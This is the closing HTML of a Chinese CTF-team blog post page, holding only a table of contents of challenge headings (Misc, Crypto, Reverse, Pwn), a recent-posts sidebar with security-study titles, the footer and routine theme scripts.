href="#EasyBaBa"><span class="toc-number">1.3.</span> <span class="toc-text">EasyBaBa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="toc-number">1.4.</span> <span class="toc-text">问卷调查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-number">1.5.</span> <span class="toc-text">小姐姐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-EasyBaBa"><span class="toc-number">1.6.</span> <span class="toc-text">Real_EasyBaBa</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cat-flag"><span class="toc-number">2.2.</span> <span class="toc-text">cat_flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%87%95%E8%A8%80%E7%87%95%E8%AF%AD"><span class="toc-number">2.3.</span> <span class="toc-text">燕言燕语</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#guessgame"><span class="toc-number">3.1.</span> <span class="toc-text">guessgame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8086"><span class="toc-number">3.2.</span> <span class="toc-text">8086</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#r2t3"><span class="toc-number">4.1.</span> <span class="toc-text">r2t3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#one-gadget"><span class="toc-number">4.2.</span> <span class="toc-text">one_gadget</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/12117287/" title="Pwnable.kr unlink"><img data-lazy-src="/img/default_cover5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwnable.kr unlink"/></a><div class="content"><a class="title" href="/archives/12117287/" title="Pwnable.kr unlink">Pwnable.kr unlink</a><time datetime="2021-03-26T09:04:13.982Z" title="更新于 2021-03-26 17:04:13">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/e258fe4d/" title="组建隧道中转流量（自建IPLC实现落地）"><img data-lazy-src="/img/default_cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="组建隧道中转流量（自建IPLC实现落地）"/></a><div class="content"><a class="title" href="/archives/e258fe4d/" title="组建隧道中转流量（自建IPLC实现落地）">组建隧道中转流量（自建IPLC实现落地）</a><time datetime="2021-03-26T09:02:03.023Z" title="更新于 2021-03-26 17:02:03">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击"><img data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持64位静态程序fini_array进行ROP攻击"/></a><div class="content"><a class="title" href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击">劫持64位静态程序fini_array进行ROP攻击</a><time datetime="2021-03-26T09:01:15.659Z" title="更新于 2021-03-26 17:01:15">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f3d2f4dc/" title="栈迁移学习（旧）"><img data-lazy-src="/img/default_cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈迁移学习（旧）"/></a><div class="content"><a class="title" href="/archives/f3d2f4dc/" title="栈迁移学习（旧）">栈迁移学习（旧）</a><time datetime="2021-03-26T09:00:31.780Z" title="更新于 2021-03-26 17:00:31">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/d7d152e1/" title="栈迁移学习（新）"><img data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈迁移学习（新）"/></a><div class="content"><a class="title" href="/archives/d7d152e1/" title="栈迁移学习（新）">栈迁移学习（新）</a><time datetime="2021-03-26T08:59:43.602Z" title="更新于 2021-03-26 16:59:43">2021-03-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover1.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By SkYe231</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://cloud.tencent.com/product/wh?from=12331" target="_blank">Hosted BY 云开发 Cloudbase</a>&nbsp;|&nbsp;<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-01-lGwrnPz3GuV4odmM.png" align="top" style="width:48px"></a><br /><div class="github-badge"><a rel="license" href="http://beian.miit.gov.cn/" target="_blank" title="粤ICP备20056619号"><span class="badge-subject">粤ICP备</span><span class="badge-value bg-black">20056619号</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
